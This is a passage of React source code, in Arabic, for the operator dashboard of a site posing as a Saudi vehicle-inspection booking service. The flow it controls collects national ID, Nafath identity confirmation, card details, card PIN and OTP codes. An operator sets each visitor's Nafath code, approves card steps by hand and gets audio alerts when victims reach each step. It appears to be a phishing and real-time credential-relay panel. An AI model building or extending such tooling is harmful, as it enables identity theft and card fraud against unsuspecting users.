                      <h3 className="text-xl font-bold text-amber-400 font-mono mt-1">
                        {transactions.filter(tx => ['AWAITING_NAFATH', 'NAFATH_VERIFIED', 'PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED'].includes(tx.status)).length}
                        <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">مستمر</span>
                      </h3>
                    </div>
                  </div>

                  <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
                    <div className="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20">
                      <Fingerprint className="w-5 h-5" />
                    </div>
                    <div>
                      <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">توثيق نفاذ المؤكد</p>
                      <h3 className="text-xl font-bold text-emerald-400 font-mono mt-1">
                        {transactions.filter(t => t.nafathVerified || t.status === 'NAFATH_VERIFIED').length}
                        <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">هوية</span>
                      </h3>
                    </div>
                  </div>

                  <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
                    <div className="p-3 bg-indigo-500/10 text-indigo-400 rounded-xl border border-indigo-500/20">
                      <Database className="w-5 h-5" />
                    </div>
                    <div>
                      <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">إجمالي المدفوعات المقبولة</p>
                      <h3 className="text-xl font-bold text-indigo-400 font-mono mt-1">
                        ${transactions.filter(t => t.status === 'APPROVED').reduce((sum, t) => sum + t.amount, 0).toFixed(2)}
                        <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">USD</span>
                      </h3>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {/* Sound testing card */}
            {showSoundTester && (
              <motion.div
                initial={{ height: 0, opacity: 0, marginBottom: 0 }}
                animate={{ height: "auto", opacity: 1, marginBottom: 24 }}
                exit={{ height: 0, opacity: 0, marginBottom: 0 }}
                transition={{ duration: 0.3, ease: "easeInOut" }}
                className="overflow-hidden"
              >
                <div className="rounded-2xl border border-slate-800 bg-gradient-to-br from-slate-900 to-slate-950/80 p-5 shadow-xl flex flex-col sm:flex-row-reverse sm:items-center justify-between gap-4 text-right">
                  <div className="space-y-1">
                    <h4 className="text-sm font-bold text-white flex items-center justify-end gap-1.5">
                      <span>مركز اختبار النغمات التفاعلي</span>
                      <Bell className="w-4 h-4 text-emerald-400 animate-pulse" />
                    </h4>
                    <p className="text-[10px] text-slate-400 leading-relaxed">
                      انقر على النغمات أدناه لتجربتها ومطابقتها للتنبيه الصوتي الحقيقي عند تفاعل المستخدمين
                    </p>
                  </div>
                  <div className="grid grid-cols-3 gap-2 w-full sm:w-auto shrink-0">
                    <button
                      type="button"
                      onClick={() => playNotificationSound('nafath')}
                      className="px-3 py-2.5 rounded-xl border border-slate-800 hover:border-emerald-500/40 bg-slate-950 text-[10px] font-bold text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
                    >
                      <Play className="w-3.5 h-3.5 text-emerald-400" />
                      <span>نغمة نفاذ 🔔</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => playNotificationSound('card')}
                      className="px-3 py-2.5 rounded-xl border border-slate-800 hover:border-indigo-500/40 bg-slate-950 text-[10px] font-bold text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
                    >
                      <Play className="w-3.5 h-3.5 text-indigo-400" />
                      <span>نغمة البطاقة 💳</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => playNotificationSound('otp')}
                      className="px-3 py-2.5 rounded-xl border border-slate-800 hover:border-cyan-500/40 bg-slate-950 text-[10px] font-bold text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
                    >
                      <Play className="w-3.5 h-3.5 text-cyan-400" />
                      <span>نغمة الرمز 🔐</span>
                    </button>
                  </div>
                </div>
              </motion.div>
            )}

            {/* NAFATH CODE CONTROLLER WIDGET */}
            {showNafathCode && (
              <motion.div
                initial={{ height: 0, opacity: 0, marginBottom: 0 }}
                animate={{ height: "auto", opacity: 1, marginBottom: 24 }}
                exit={{ height: 0, opacity: 0, marginBottom: 0 }}
                transition={{ duration: 0.3, ease: "easeInOut" }}
                className="overflow-hidden"
              >
                <div className="rounded-2xl border border-slate-800/85 bg-gradient-to-r from-slate-900 via-slate-900 to-emerald-950/25 p-5 shadow-xl relative overflow-hidden text-right">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-2xl pointer-events-none" />
                  <div className="flex flex-col sm:flex-row-reverse items-start sm:items-center justify-between gap-4">
                    <div className="space-y-1">
                      <h3 className="text-sm font-bold text-white flex items-center justify-end gap-2">
                        <span>التحكم برمز التحقق الافتراضي (نفاذ الموحد)</span>
                        <Fingerprint className="h-4 w-4 text-emerald-400" />
                      </h3>
                      <p className="text-[10px] text-slate-400 leading-relaxed">
                        الرمز الافتراضي التلقائي الذي يظهر لأي مستخدم جديد يسجل الدخول عبر تطبيق نفاذ (يمكنك أيضاً تغيير الرمز لكل عميل بشكل مخصص من بطاقته أدناه)
                      </p>
                    </div>

                    <form onSubmit={handleUpdateNafathCode} className="flex items-center gap-2 w-full sm:w-auto">
                      <button
                        type="submit"
                        disabled={isUpdatingNafath}
                        className="h-9 px-4 rounded-lg bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white text-xs font-bold transition flex items-center gap-1.5 shrink-0 cursor-pointer"
                      >
                        {isUpdatingNafath ? 'جاري التحديث...' : 'تحديث الرمز'}
                      </button>
                      <div className="relative">
                        <input
                          type="text"
                          maxLength={4}
                          value={nafathCodeInput}
                          onChange={(e) => setNafathCodeInput(e.target.value.replace(/\D/g, ''))}
                          placeholder="26"
                          className="block w-20 h-9 text-center font-mono font-black text-lg text-emerald-400 bg-slate-950 border border-slate-850 rounded-lg focus:ring-1 focus:ring-emerald-500 focus:outline-none"
                        />
                      </div>
                    </form>
                  </div>

                  <AnimatePresence>
                    {(nafathConfigError || nafathConfigSuccess) && (
                      <motion.div
                        initial={{ opacity: 0, height: 0 }}
                        animate={{ opacity: 1, height: 'auto' }}
                        exit={{ opacity: 0, height: 0 }}
                        className="mt-3 flex justify-end"
                      >
                        {nafathConfigError && (
                          <div className="text-[10px] font-mono text-rose-400 bg-rose-500/5 border border-rose-500/10 rounded px-2.5 py-1.5 w-full text-right">
                            ⚠️ {nafathConfigError}
                          </div>
                        )}
                        {nafathConfigSuccess && (
                          <div className="text-[10px] font-sans text-emerald-400 bg-emerald-500/5 border border-emerald-500/10 rounded px-2.5 py-1.5 flex items-center gap-1.5 w-full justify-end">
                            <span>{nafathConfigSuccess}</span>
                            <CheckCircle className="w-3.5 h-3.5" />
                          </div>
                        )}
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          <div className="space-y-6 mb-8 text-right animate-fade-in">

            {/* Global Notifications Alert Banner */}
            <AnimatePresence>
              {(actionError || successMessage) && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  className="w-full"
                >
                  {actionError && (
                    <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3.5 text-xs text-rose-400 flex items-center justify-end space-x-2 space-x-reverse shadow-lg">
                      <span>{actionError}</span>
                      <XCircle className="h-4 w-4 shrink-0" />
                    </div>
                  )}
                  {successMessage && (
                    <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/10 p-3.5 text-xs text-emerald-400 flex items-center justify-end space-x-2 space-x-reverse shadow-lg">
                      <span>{successMessage}</span>
                      <CheckCircle className="h-4 w-4 shrink-0" />
                    </div>
                  )}
                </motion.div>
              )}
            </AnimatePresence>

            {/* DEVELOPMENT SIMULATOR & FAST NAVIGATOR PANEL */}
            <AnimatePresence initial={false}>
              {isDevToolsExpanded && (
                <motion.div
                  initial={{ height: 0, opacity: 0, marginBottom: 0 }}
                  animate={{ height: "auto", opacity: 1, marginBottom: 24 }}
                  exit={{ height: 0, opacity: 0, marginBottom: 0 }}
                  transition={{ duration: 0.25, ease: "easeInOut" }}
                  className="overflow-hidden"
                >
                  <div className="rounded-2xl border border-slate-800/80 bg-slate-900/40 backdrop-blur-md p-5 shadow-xl text-right relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-32 h-32 bg-indigo-500/5 rounded-full blur-2xl pointer-events-none" />
                    
                    <div className="flex flex-col sm:flex-row-reverse items-start sm:items-center justify-between gap-4 border-b border-slate-800/60 pb-4 mb-4">
                      <div className="space-y-1 text-right flex-1">
                        <h3 className="text-sm font-black text-white flex items-center justify-end gap-2">
                          <Sparkles className="h-4 w-4 text-emerald-400 shrink-0" />
                          <span>أدوات محاكاة التطوير والتنقل السريع 🛠️</span>
                        </h3>
                        <p className="text-[10px] text-slate-400 leading-relaxed">
                          حقن بيانات تجريبية فورية والتنقل السريع لتسهيل تجربة ومراجعة كافة خطوات الموقع والتحقق المزدوج دون تعبئة يدوية متكررة
                        </p>
                      </div>
                    </div>

                    <div className="pt-2">
                      {injectedMsg && (
                        <div className="mb-4 bg-emerald-500/10 text-emerald-400 text-xs px-4 py-2.5 rounded-xl border border-emerald-500/20 text-center animate-pulse">
                          {injectedMsg}
                        </div>
                      )}

                      {/* Action Buttons to Inject Mock Data */}
                      <div className="space-y-3 mb-6">
                        <span className="block text-xs font-bold text-slate-300">حقن بيانات تجريبية فورية لتجنب إعادة الإدخال:</span>
                        <div className="flex flex-wrap gap-2 justify-start sm:justify-end">
                          <button
                            onClick={injectMockBookingState}
                            className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-emerald-800 hover:bg-emerald-700 text-white text-xs font-bold transition cursor-pointer"
                          >
                            <span>تجهيز بيانات حجز 🚗</span>
                          </button>
                          <button
                            onClick={() => injectMockTransaction('PENDING_CARD_APPROVAL')}
                            className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-sky-600 hover:bg-sky-500 text-white text-xs font-bold transition cursor-pointer"
                          >
                            <span>تجهيز عملية دفع 💳</span>
                          </button>
                          <button
                            onClick={() => injectMockTransaction('AWAITING_NAFATH')}
                            className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-amber-600 hover:bg-amber-500 text-white text-xs font-bold transition cursor-pointer"
                          >
                            <span>نفاذ ⏳</span>
                          </button>
                          <button
                            onClick={() => injectMockTransaction('AWAITING_PIN')}
                            className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-teal-600 hover:bg-teal-500 text-white text-xs font-bold transition cursor-pointer"
                          >
                            <span>طلب PIN 🔑</span>
                          </button>
                          <button
                            onClick={() => injectMockTransaction('AWAITING_OTP')}
                            className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-violet-600 hover:bg-violet-500 text-white text-xs font-bold transition cursor-pointer"
                          >
                            <span>طلب OTP 🔑</span>
                          </button>
                          <button
                            onClick={() => injectMockTransaction('APPROVED')}
                            className="flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold transition cursor-pointer"
                          >
                            <span>دفع مقبول ✅</span>
                          </button>
                        </div>
                      </div>

                      {/* Page Links Grid */}
                      <div className="space-y-3">
                        <span className="block text-xs font-bold text-slate-300">اختر الصفحة للانتقال إليها مباشرة:</span>
                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
                          {[
                            { name: 'الرئيسية (حجز موعد)', path: '/', desc: 'حجز موعد فحص دوري' },
                            { name: 'البحث عن مراكز الفحص', path: '/search-centers', desc: 'خرائط ومواقع مراكز الفحص' },
                            { name: 'تفاصيل ورسوم الفحص', path: '/inspection-fees', desc: 'تفاصيل تكاليف الفحص' },
                            { name: 'ملخص الحجز', path: '/booking-summary', desc: 'مراجعة تفاصيل السيارة والمالك' },
                            { name: 'تسجيل دخول نفاذ', path: '/nafath-login', desc: 'تسجيل الدخول الموحد نفاذ' },
                            { name: 'رمز مطابقة نفاذ', path: '/nafath-code', desc: 'انتظار الموافقة ورمز المطابقة الثنائي' },
                            { name: 'بوابة الدفع الإلكتروني', path: '/checkout', desc: 'إدخال بطاقة الدفع (مدى / فيزا)' },
                            { name: 'شاشة الرقم السري PIN', path: '/card-pin', desc: 'تأكيد هوية حامل البطاقة بإدخال PIN' },
                            { name: 'شاشة الانتظار والموافقة', path: '/waiting', desc: 'شاشة انتظار قرار الأدمن لبطاقة الدفع' },
                            { name: 'صفحة رمز الأمان OTP', path: '/otp', desc: 'إدخال رمز التحقق الثنائي للبطاقة البنكية' },
                            { name: 'إيصال النجاح والطباعة', path: '/success', desc: 'اكتمال الدفع وإصدار إيصال الحجز المعتمد' }
                          ].map((p) => (
                            <button
                              key={p.path}
                              onClick={() => handlePageClick(p.path)}
                              className="text-right p-3 rounded-xl border border-slate-800 hover:border-slate-700 bg-slate-950/40 hover:bg-slate-900/40 transition cursor-pointer flex flex-col justify-between gap-1 group"
                            >
                              <span className="block text-xs font-black text-slate-200 group-hover:text-emerald-400 transition">
                                {p.name}
                              </span>
                              <span className="block text-[9px] text-slate-500 leading-normal">
                                {p.desc}
                              </span>
                            </button>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* LIVE ACTIVE USERS PANEL */}
            <div className="rounded-2xl border border-slate-800/80 bg-slate-900/40 backdrop-blur-md p-5 shadow-xl text-right relative overflow-hidden mb-6">
              <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-500/5 rounded-full blur-2xl pointer-events-none" />
              
              <div className="flex flex-col sm:flex-row-reverse items-start sm:items-center justify-between gap-4 border-b border-slate-800/60 pb-4 mb-4">
                <div className="space-y-1 text-right flex-1">
                  <h3 className="text-sm font-black text-white flex items-center justify-end gap-2">
                    <span className="relative flex h-2 w-2">
                      <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-450 opacity-75"></span>
                      <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-500"></span>
                    </span>
                    <span>العملاء النشطون في الموقع حالياً ({activeUsers.length})</span>
                  </h3>
                  <p className="text-[10px] text-slate-400 leading-relaxed">
                    مراقبة حية وتتبع فوري للصفحات التي يتصفحها العملاء حالياً لمساعدتك على اتخاذ الإجراءات والموافقات بسرعة وتوقع الحجوزات القادمة
                  </p>
                </div>
                <div className="text-xs px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold shrink-0">
                  تحديث حي (ثانيتين)
                </div>
              </div>

              {activeUsers.length === 0 ? (
                <div className="py-8 text-center bg-slate-950/20 rounded-xl border border-dashed border-slate-800/50 flex flex-col items-center justify-center space-y-2">
                  <Activity className="h-6 w-6 text-slate-600 animate-pulse" />
                  <p className="text-xs text-slate-500 font-bold">بانتظار دخول زوار جدد للموقع...</p>
                  <p className="text-[10px] text-slate-600 leading-normal">تتحقق المنصة باستمرار من نشاط الزوار وتظهرهم هنا بمجرد فتحهم لأي صفحة</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                  {activeUsers.map((user) => {
                    const secondsAgo = Math.max(0, Math.round((Date.now() - new Date(user.lastActive).getTime()) / 1000));
                    return (
                      <div
                        key={user.sessionId}
                        className="p-3.5 rounded-xl border border-slate-800 bg-slate-950/30 hover:bg-slate-950/50 hover:border-slate-700 transition duration-200 flex flex-col justify-between gap-3 text-right group relative overflow-hidden"
                      >
                        {/* Animated background line */}
                        <div className="absolute bottom-0 right-0 left-0 h-[2px] bg-gradient-to-r from-emerald-500/0 via-emerald-500/30 to-emerald-500/0 opacity-0 group-hover:opacity-100 transition-opacity" />
                        
                        <div className="flex items-start justify-between gap-2 flex-row-reverse">
                          <div className="text-right">
                            <span className="block text-xs font-black text-slate-100 group-hover:text-emerald-400 transition">
                              {user.fullName || 'زائر مجهول'}
                            </span>
                            {user.phone && user.phone !== 'لا يوجد رقم' ? (
                              <span className="block text-[10px] text-slate-400 font-mono mt-0.5" dir="ltr">
                                {user.phone}
                              </span>
                            ) : (
                              <span className="block text-[9px] text-slate-500 mt-0.5">
                                زائر غير مسجل
                              </span>
                            )}
                          </div>
                          
                          <span className="text-[9px] px-2 py-0.5 rounded-md bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-mono flex items-center gap-1">
                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping shrink-0" />
                            <span>{secondsAgo <= 2 ? 'الآن' : `منذ ${secondsAgo}ث`}</span>
                          </span>
                        </div>

                        <div className="bg-slate-900/60 rounded-lg p-2 border border-slate-800/60 flex items-center justify-between flex-row-reverse text-right">
                          <span className="text-[9px] text-slate-500 font-bold">الصفحة الحالية:</span>
                          <span className="text-[10px] font-black text-slate-300 group-hover:text-white transition">
                            {user.pageTitle}
                          </span>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>

            {/* Dynamic Filters and Search Panel */}
            <div className="rounded-2xl border border-slate-800/80 bg-slate-900/20 backdrop-blur-md p-5 shadow-xl text-right">
              <div className="flex flex-col md:flex-row-reverse justify-between items-stretch md:items-center gap-4 mb-5 pb-5 border-b border-slate-900">
                <div>
                  <h3 className="text-md font-bold text-white flex items-center justify-end gap-2">
                    <span>ملفات بروفايل المستخدمين المباشرة ({filteredTx.length})</span>
                    <Database className="h-4.5 w-4.5 text-indigo-400" />
                  </h3>
                  <p className="text-[10px] text-slate-400">مراقبة تفصيلية فورية لكل شخص متصل الآن - بروفايل كامل مستقل لكل عميل</p>
                </div>

                {/* Search bar */}
                <div className="relative max-w-sm w-full md:w-80">
                  <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none text-slate-500">
                    <Search className="h-4 w-4" />
                  </div>
                  <input
                    type="text"
                    placeholder="بحث باسم العميل، رقم المعاملة، الهوية..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="block w-full h-10 pl-9 pr-4 text-xs bg-slate-950 border border-slate-800 rounded-xl text-white text-right focus:ring-2 focus:ring-indigo-500 focus:outline-none"
                  />
                </div>
              </div>

              {/* Filter Status Tabs */}
              <div className="flex flex-wrap flex-row-reverse gap-1.5 bg-slate-950/60 p-1 rounded-xl border border-slate-900/80">
                {[
                  { id: 'All', label: 'الكل' },
                  { id: 'AWAITING_NAFATH', label: 'بانتظار نفاذ ⏳' },
                  { id: 'NAFATH_VERIFIED', label: 'نفاذ موثق ✅' },
                  { id: 'PENDING_CARD_APPROVAL', label: 'بانتظار البطاقة 💳' },
                  { id: 'AWAITING_OTP', label: 'بانتظار الرمز 🔑' },
                  { id: 'OTP_SUBMITTED', label: 'رمز جديد 🔐' },
                  { id: 'APPROVED', label: 'مقبول 👍' },
                  { id: 'REJECTED', label: 'مرفوض ❌' }
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setStatusFilter(tab.id)}
                    className={`px-3.5 py-1.5 text-[11px] font-bold rounded-lg transition cursor-pointer ${
                      statusFilter === tab.id
                        ? 'bg-slate-800 text-white border border-slate-750/75'
                        : 'text-slate-400 hover:text-white'
                    }`}
                  >
                    {tab.label}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Grid of Complete Live User Profiles */}
          {isLoading ? (
            <div className="py-24 text-center">
              <RefreshCw className="h-10 w-10 text-indigo-500 animate-spin mx-auto mb-4" />
              <p className="text-sm font-mono text-slate-500">جاري مزامنة قاعدة البيانات وجلب البروفايلات النشطة...</p>
            </div>
          ) : filteredTx.length === 0 ? (
            <div className="py-24 text-center border border-dashed border-slate-800 bg-slate-900/10 rounded-3xl">
              <ShieldAlert className="h-12 w-12 text-slate-600 mx-auto mb-3 animate-pulse" />
              <h4 className="text-sm font-bold text-slate-350">لا توجد ملفات بروفايل مطابقة حالياً</h4>
              <p className="text-xs text-slate-500 mt-1 max-w-md mx-auto leading-relaxed">
                عند قيام المستخدمين بالدخول للموقع والبدء بالتسجيل، ستظهر بروفايلاتهم الكاملة هنا فوراً مع إمكانية تحديث مساراتهم والتحكم بها لحظياً.
              </p>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
              {filteredTx.map(tx => {
                // Check card status for custom text styling
                const cardAwaiting = tx.cardNumber === 'Awaiting Card...' || !tx.cardNumber;

                return (
                  <div
                    key={tx.id}
                    className="relative rounded-3xl border border-slate-800 bg-slate-900/40 p-6 backdrop-blur-xl shadow-2xl hover:border-slate-700/80 transition duration-300 overflow-hidden flex flex-col justify-between gap-5 text-right"
                  >
                    {/* Visual Status Indicator Top Colored Edge */}
                    <div className={`absolute top-0 inset-x-0 h-1 bg-gradient-to-r ${
                      tx.status === 'APPROVED' ? 'from-emerald-500 to-teal-500' :
                      tx.status === 'REJECTED' ? 'from-rose-500 to-red-500' :
                      tx.status === 'OTP_SUBMITTED' ? 'from-cyan-500 to-blue-500 animate-pulse' :
                      tx.status === 'AWAITING_OTP' ? 'from-indigo-500 to-purple-500' :
                      tx.status === 'AWAITING_NAFATH' ? 'from-amber-500 to-yellow-500' :
                      'from-slate-600 to-slate-700'
                    }`} />

                    {/* Profile header with user metadata */}
                    <div className="flex flex-row-reverse justify-between items-start gap-4">
                      <div className="space-y-1">
                        <div className="flex flex-row-reverse items-center gap-1.5 flex-wrap">
                          <span className="text-slate-500 text-[10px] font-mono font-bold tracking-wider">{tx.id}</span>
                          <span className={`inline-flex items-center rounded-md px-2 py-0.5 text-[9px] font-bold ${
                            tx.status === 'APPROVED' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
                            tx.status === 'REJECTED' ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20' :
                            tx.status === 'AWAITING_OTP' ? 'bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 animate-pulse' :
                            tx.status === 'OTP_SUBMITTED' ? 'bg-cyan-500/10 text-cyan-450 border border-cyan-500/20 animate-bounce font-black' :
                            tx.status === 'AWAITING_NAFATH' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20 animate-pulse' :
                            tx.status === 'NAFATH_VERIFIED' ? 'bg-teal-500/10 text-teal-400 border border-teal-500/20' :
                            'bg-slate-500/10 text-slate-350 border border-slate-700/60'
                          }`}>
                            {tx.status === 'APPROVED' ? 'مكتمل ومقبول 👍' :
                             tx.status === 'REJECTED' ? 'مرفوض ❌' :
                             tx.status === 'AWAITING_OTP' ? 'بانتظار رمز الـ OTP 🔑' :
                             tx.status === 'OTP_SUBMITTED' ? 'تم إدخال الرمز 🔐' :
                             tx.status === 'AWAITING_NAFATH' ? 'بانتظار مطابقة نفاذ ⏳' :
                             tx.status === 'NAFATH_VERIFIED' ? 'تم توثيق نفاذ ✅' :
                             'بانتظار البطاقة 💳'}
                          </span>
                        </div>
                        <h3 className="text-base font-extrabold text-white truncate max-w-[200px]" title={tx.personalInfo?.fullName || tx.cardholderName}>
                          {tx.personalInfo?.fullName || tx.cardholderName || 'مستند مجهول'}
                        </h3>
                        {(tx.personalInfo?.idNumber || tx.nationalId) && (
                          <div className="flex flex-row-reverse items-center gap-1.5 text-xs text-slate-400">
                            <span className="font-mono font-bold text-slate-300">{tx.personalInfo?.idNumber || tx.nationalId}</span>
                            <span className="text-slate-500">:الهوية الوطنية</span>
                          </div>
                        )}
                      </div>

                      {/* Financial amount and timestamp */}
                      <div className="text-left flex flex-col items-start gap-1">
                        <span className="text-emerald-400 font-extrabold font-mono text-sm">${tx.amount.toFixed(2)}</span>
                        <span className="text-[9px] font-mono text-slate-500">
                          {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                        </span>
                        {tx.serviceName && (
                          <span className="text-[9px] font-bold bg-[#004d33]/35 text-[#2dd4bf] px-2 py-0.5 rounded-md border border-[#2dd4bf]/20 mt-1 max-w-[120px] truncate">
                            {tx.serviceName}
                          </span>
                        )}
                      </div>
                    </div>

                    {/* Booking & Reservation Details Block (New Feature requested by user) */}
                    <div className="bg-slate-950/70 rounded-2xl border border-indigo-500/15 overflow-hidden flex flex-col">
                      <div className="bg-indigo-950/40 px-4 py-3 border-b border-indigo-500/10 flex flex-row-reverse justify-between items-center text-right">
                        <span className="flex flex-row-reverse items-center gap-2 text-xs font-black text-indigo-300">
                          <span className="text-[14px]">📄</span>
                          <span>بيانات حجز العميل والمستخدم الكاملة</span>
                        </span>
                        <span className="text-[9px] font-mono text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded-full border border-emerald-500/15">
                          مدخلة من العميل
                        </span>
                      </div>

                      {(!tx.bookingMeta && !tx.personalInfo && !tx.vehicleInfo) ? (
                        <div className="p-4 text-center text-slate-500 text-[11px] leading-relaxed">
                          لم يتم تمرير تفاصيل حجز إضافية مع هذه المعاملة (الطلب تم إرساله مباشرة من بوابة الدفع).
                        </div>
                      ) : (
                        <div className="p-4 space-y-4 text-right bg-slate-950/20 text-[11px] text-slate-300 leading-relaxed font-sans">
                          {/* 1. Customer & Identification details */}
                          {tx.personalInfo && (
                            <div className="space-y-2 pb-3.5 border-b border-slate-900/60">
                              <h4 className="text-indigo-400 font-bold text-[11px] flex flex-row-reverse items-center gap-1.5 mb-2">
                                <span>👤</span>
                                <span>بيانات صاحب الطلب والاتصال:</span>
                              </h4>
                              <div className="flex flex-col gap-1.5 text-xs">
                                <div className="flex flex-row-reverse items-center justify-between border-b border-slate-900/30 pb-1">
                                  <span className="text-slate-500">الاسم الكامل:</span>
                                  <span className="font-extrabold text-slate-100 text-[13px]">{tx.personalInfo.fullName || '—'}</span>
                                </div>
                                <div className="flex flex-row-reverse items-center justify-between border-b border-slate-900/30 pb-1">
                                  <span className="text-slate-500">رقم الهوية:</span>
                                  <span className="font-mono font-bold text-indigo-300 bg-indigo-500/10 border border-indigo-500/15 px-2 py-0.5 rounded text-[11px] select-all">{tx.personalInfo.idNumber || '—'}</span>
                                </div>
                                <div className="flex flex-row-reverse items-center justify-between border-b border-slate-900/30 pb-1">
                                  <span className="text-slate-500">رقم الجوال:</span>
                                  <span className="font-mono text-emerald-400 font-extrabold text-[12px] bg-emerald-500/5 border border-emerald-500/10 px-2 py-0.5 rounded select-all" dir="ltr">
                                    {tx.personalInfo.mobile || '—'}
                                  </span>
                                </div>
                                <div className="flex flex-row-reverse items-center justify-between border-b border-slate-900/30 pb-1">
                                  <span className="text-slate-500">البريد الإلكتروني:</span>
                                  <span className="font-mono text-slate-300 select-all truncate max-w-[200px]">{tx.personalInfo.email || '—'}</span>
                                </div>
                                <div className="flex flex-row-reverse items-center justify-between">
                                  <span className="text-slate-500">الجنسية:</span>
                                  <span className="text-slate-100 font-semibold">{tx.personalInfo.nationality || '—'}</span>
                                </div>
                                
                                {tx.personalInfo.isDelegated && (
                                  <div className="bg-indigo-950/30 border border-indigo-500/20 p-2.5 rounded-xl mt-1.5 text-[11px] space-y-1.5">
                                    <p className="font-black text-indigo-400 flex flex-row-reverse items-center gap-1">
                                      <span>📋</span>
                                      <span>بيانات تفويض الفحص الدوري:</span>
                                    </p>
                                    {tx.personalInfo.delegatedDetails ? (
                                      <div className="space-y-1 text-slate-300">
                                        <div className="flex flex-row-reverse justify-between border-b border-indigo-500/5 pb-0.5">
                                          <span className="text-indigo-400/70">المفوض:</span>
                                          <span className="font-bold">{tx.personalInfo.delegatedDetails.name}</span>
                                        </div>
                                        <div className="flex flex-row-reverse justify-between border-b border-indigo-500/5 pb-0.5">
                                          <span className="text-indigo-400/70">الهوية:</span>
                                          <span className="font-mono text-indigo-200">{tx.personalInfo.delegatedDetails.id} ({tx.personalInfo.delegatedDetails.nationality})</span>
                                        </div>
                                        <div className="flex flex-row-reverse justify-between">
                                          <span className="text-indigo-400/70">الجوال:</span>
                                          <span className="font-mono text-emerald-400" dir="ltr">{tx.personalInfo.delegatedDetails.mobile}</span>
                                        </div>
                                      </div>
                                    ) : (
                                      <div className="text-slate-500 italic">بيانات المفوض غير متوفرة</div>
                                    )}
                                  </div>
                                )}
                              </div>
                            </div>
                          )}

                          {/* 2. Booking center & Appointment Metadata */}
                          {tx.bookingMeta && (
                            <div className="space-y-2 pb-3.5 border-b border-slate-900/60">
                              <h4 className="text-indigo-400 font-bold text-[11px] flex flex-row-reverse items-center gap-1.5 mb-2">
                                <span>📍</span>
                                <span>تفاصيل المركز والموعد الفني:</span>
                              </h4>
                              <div className="flex flex-col gap-1.5 text-xs">
                                <div className="flex flex-row-reverse items-center justify-between border-b border-slate-900/30 pb-1">
                                  <span className="text-slate-500">المنطقة والمدينة:</span>
                                  <span className="text-slate-100 font-medium">{tx.bookingMeta.region || '—'}</span>
                                </div>
                                <div className="flex flex-row-reverse items-center justify-between border-b border-slate-900/30 pb-1">
                                  <span className="text-slate-500">مركز الفحص:</span>
                                  <span className="font-extrabold text-indigo-300">{tx.bookingMeta.center || '—'}</span>
                                </div>
                                <div className="flex flex-row-reverse items-center justify-between bg-indigo-500/10 p-2 rounded-xl border border-indigo-500/15">
                                  <span className="text-indigo-300 font-extrabold">تاريخ ووقت الموعد:</span>
                                  <span className="font-black text-indigo-100 text-[12px]">{tx.bookingMeta.dateTime || '—'}</span>
                                </div>
                                <div className="flex flex-row-reverse items-center justify-between mt-1">
                                  <span className="text-slate-500">نوع المركبة:</span>
                                  <span className="text-slate-100 font-semibold">{tx.bookingMeta.vehicleType || '—'}</span>
                                </div>
                              </div>
                            </div>
                          )}

                          {/* 3. Vehicle license plate Preview */}
                          {tx.vehicleInfo && (
                            <div className="space-y-2.5">
                              <h4 className="text-indigo-400 font-bold text-[11px] flex flex-row-reverse items-center gap-1.5">
                                <span>🚗</span>
                                <span>بيانات المركبة ولوحة الفحص الفني:</span>
                              </h4>
